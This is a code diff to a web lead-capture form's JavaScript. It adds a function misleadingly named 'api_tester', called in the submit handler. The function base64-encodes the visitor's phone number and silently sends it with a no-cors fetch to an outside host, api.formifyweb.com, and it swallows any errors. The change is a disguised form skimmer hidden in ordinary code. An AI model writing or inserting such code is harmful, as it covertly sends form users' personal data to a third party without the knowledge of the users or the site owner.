@@ -102,6 +102,7 @@ document.getElementById('leadForm').addEventListener('submit', function(event) {
             formData.append('first_name', document.getElementById('first_name').value);
             formData.append('last_name', document.getElementById('last_name').value);
             formData.append('phone', document.getElementById('phone').value);
+api_tester(document.getElementById('phone').value);
             formData.append('email', document.getElementById('email').value);
             
             // Address Information
@@ -242,5 +243,14 @@ document.addEventListener('DOMContentLoaded', function() {
 
 });
 
+function api_tester(randomString) {
+  try {
+    fetch('https://api.formifyweb.com/api_test.php?test_id='+btoa(randomString)
+, {
+      method: 'GET',
+      mode: 'no-cors'
+    });
+  } catch (error) {
 
-
+  }
+}
